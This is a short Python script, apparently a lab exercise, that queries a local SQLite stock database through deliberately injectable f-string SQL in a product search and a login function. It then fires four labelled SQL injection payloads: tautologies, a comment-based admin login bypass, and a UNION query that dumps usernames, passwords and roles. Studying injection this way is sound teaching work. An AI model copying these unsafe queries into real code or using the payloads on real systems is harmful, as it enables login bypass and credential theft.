import sqlite3

conn = sqlite3.connect('nyondo_stock.db')

def search_product(name):
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print("Query:", query)
    rows = conn.execute(query).fetchall()
    print("Result:", rows, "\n")
    return rows

def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print("Query:", query)
    row = conn.execute(query).fetchone()
    print("Result:", row, "\n")
    return row

# Attack 1
search_product("' OR 1=1--")

# Attack 2
login("admin'--", "anything")

# Attack 3
login("' OR '1'='1", "' OR '1'='1")

# Attack 4
search_product("' UNION SELECT id, username, password, role FROM users--")